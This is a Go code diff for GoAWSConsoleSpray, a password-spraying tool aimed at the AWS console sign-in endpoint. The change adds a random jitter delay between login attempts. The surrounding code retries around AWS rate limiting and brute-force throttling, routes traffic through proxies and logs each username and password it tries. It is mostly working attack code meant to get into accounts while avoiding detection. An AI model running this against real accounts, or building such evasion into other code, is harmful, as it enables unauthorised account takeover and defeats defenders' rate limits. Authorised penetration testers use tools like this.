@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"io"
 	"log"
+	"math/rand/v2"
 	"net/http"
 	"net/url"
 	"os"
@@ -45,6 +46,7 @@ var (
 	fStopOnSuccess bool
 	fSleep         int
 	fDelay         int
+	fJitter        int
 
 	signinURL = "https://signin.aws.amazon.com/authenticate"
 	title     = "GoAWSConsoleSpray"
@@ -80,6 +82,7 @@ func init() {
 	rootCmd.Flags().StringVarP(&fPassfile, "passfile", "p", "", "Password string or file (required)")
 	rootCmd.Flags().IntVarP(&fSleep, "sleep", "z", 0, "Optional Time to sleep between password requests")
 	rootCmd.Flags().IntVarP(&fDelay, "delay", "d", 0, "Optional Time Delay Between Requests for rate limiting")
+	rootCmd.Flags().IntVarP(&fJitter, "jitter", "j", 0, "Optional Time Jitter Between Requests (0 to n)")
 	rootCmd.Flags().StringVarP(&fProxy, "proxy", "x", "", "HTTP or Socks proxy URL & Port. Schema: proto://ip:port")
 	rootCmd.Flags().BoolVarP(&fStopOnSuccess, "stopOnSuccess", "s", false, "Stop password spraying on successful hit")
 
@@ -153,10 +156,11 @@ func spray() {
 
 	// Spraying Loop
 	log.Printf("%s: [%d] users loaded. [%d] passwords loaded. [%d] potential login requests.", title, len(usernameList), len(passwordList), (len(usernameList) * len(passwordList)))
+	log.Printf("%s: [%d] Delay [%d] Jitter [%d] Sleep [%s] Proxy [%t] StopOnSuccess", title, fDelay, fJitter, fSleep, fProxy, fStopOnSuccess)
 loop:
 	for i, pass := range passwordList {
 		for _, user := range usernameList {
-			check := attemptLogin(client, user, pass, fAccountID, fDelay, 1)
+			check := attemptLogin(client, user, pass, fAccountID, fDelay, fJitter, 1)
 			// connection failures and stop on succes
 			if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS) {
 				break loop
@@ -173,7 +177,7 @@ loop:
 	}
 }
 
-func attemptLogin(client *retryablehttp.Client, username string, password string, accountID string, delay int, bfSleepRounds int) ReturnStatus {
+func attemptLogin(client *retryablehttp.Client, username string, password string, accountID string, delay int, jitter int, bfSleepRounds int) ReturnStatus {
 	// check against empty strings from the file
 	if len(username) < 1 || len(password) < 1 {
 		return FAILED
@@ -182,6 +186,11 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 	// add rate limiting
 	if delay > 0 {
 		time.Sleep(time.Duration(delay) * time.Second)
+	}
+
+	// add jitter
+	if jitter > 0 {
+		time.Sleep(time.Duration(rand.IntN(jitter)) * time.Second)
 	}
 
 	// post params
@@ -214,7 +223,7 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 		if resp.StatusCode == 429 {
 			log.Printf("[!] WARNING:\tarn:aws:iam::%s:user/%s\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n", fAccountID, username)
 			time.Sleep(4 * time.Second)
-			return attemptLogin(client, username, password, accountID, delay, 1)
+			return attemptLogin(client, username, password, accountID, delay, jitter, 1)
 		}
 
 		// Unmarshal the JSON response from AWS
@@ -239,7 +248,7 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 				time.Sleep(time.Duration(5*bfSleepRounds) * time.Second)
 
 				// increase the time delay since we have hit the bruteforce ratelimit check
-				return attemptLogin(client, username, password, accountID, delay, (bfSleepRounds + 1))
+				return attemptLogin(client, username, password, accountID, delay, jitter, (bfSleepRounds + 1))
 			}
 			log.Printf("[-] FAIL:\tarn:aws:iam::%s:user/%s\tInvalid Password: %s\n", fAccountID, username, password)
 			return FAILED
